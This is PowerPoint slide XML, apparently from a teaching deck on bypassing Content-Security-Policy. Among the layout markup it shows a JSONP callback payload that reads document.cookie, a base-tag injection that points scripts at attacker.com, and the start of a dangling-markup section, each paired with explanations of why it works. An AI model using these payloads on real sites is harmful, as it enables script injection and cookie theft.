          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739140" y="4852868"/>
            <a:ext cx="13152120" cy="642938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4927"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="728663" y="4852868"/>
            <a:ext cx="13173075" cy="642938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4927"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="939760" y="5011222"/>
            <a:ext cx="12750879" cy="326231"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="255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&lt;script src="https://api.example.com/data?callback=alert(document.cookie)"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739140" y="5790724"/>
            <a:ext cx="2639735" cy="329922"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739140" y="6415564"/>
            <a:ext cx="13152120" cy="978733"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>JSONP allows callback parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Callback executes as JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Domain is whitelisted in CSP</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48445" y="1085017"/>
            <a:ext cx="4781312" cy="396121"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 3: Base Tag Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1848445" y="1757720"/>
            <a:ext cx="1980605" cy="247650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1848445" y="2129790"/>
            <a:ext cx="5273516" cy="452914"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5248"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1840587" y="2129790"/>
            <a:ext cx="5289233" cy="452914"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5248"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1998940" y="2248614"/>
            <a:ext cx="4972526" cy="215265"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Content-Security-Policy: script-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1848445" y="2707124"/>
            <a:ext cx="1980605" cy="247650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable HTML:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1848445" y="3079194"/>
            <a:ext cx="5273516" cy="2605564"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 912"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1840587" y="3079194"/>
            <a:ext cx="5289233" cy="2605564"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 912"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1998940" y="3198019"/>
            <a:ext cx="4972526" cy="2367915"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;html&gt;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&lt;head&gt;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&lt;title&gt;Vulnerable Page&lt;/title&gt;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&lt;base href="&lt;!-- User controlled input --&gt;"&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;h1&gt;Welcome&lt;/h1&gt;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&lt;script src="/js/app.js"&gt;&lt;/script&gt;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&lt;/body&gt;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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516058" y="1757720"/>
            <a:ext cx="1980605" cy="247650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516058" y="2129790"/>
            <a:ext cx="5273516" cy="452914"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5248"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7508200" y="2129790"/>
            <a:ext cx="5289233" cy="452914"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5248"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7666553" y="2248614"/>
            <a:ext cx="4972526" cy="215265"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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https://victim.com/?base=https://attacker.com/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516058" y="2707124"/>
            <a:ext cx="1980605" cy="247650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516058" y="3079194"/>
            <a:ext cx="5273516" cy="2820829"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 843"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7508200" y="3079194"/>
            <a:ext cx="5289233" cy="2820829"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 843"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7666553" y="3198019"/>
            <a:ext cx="4972526" cy="2583180"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;html&gt;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&lt;head&gt;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&lt;title&gt;Vulnerable Page&lt;/title&gt;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&lt;base href="https://attacker.com/"&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;h1&gt;Welcome&lt;/h1&gt;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 Script now resolves to https://attacker.com/js/app.js --&gt;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  &lt;script src="/js/app.js"&gt;&lt;/script&gt;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&lt;/body&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516058" y="6024443"/>
            <a:ext cx="1980605" cy="247650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516058" y="6382702"/>
            <a:ext cx="5273516" cy="645962"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The &lt;base&gt; tag changes relative URL resolution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Script is still loaded from "self" (relative path)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP doesn't check the base tag by default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1321118"/>
            <a:ext cx="4378643" cy="283488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Technique 4: Dangling Markup Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1717953"/>
            <a:ext cx="1913811" cy="5190411"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="1831300"/>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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="2072164"/>
            <a:ext cx="1687116" cy="578287"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2942"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="2072164"/>
            <a:ext cx="1698308" cy="578287"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2942"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3623548" y="2157174"/>
            <a:ext cx="1471613" cy="408265"/>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script-src 'self'; default-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5372933" y="1717953"/>
            <a:ext cx="1913930" cy="5190411"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
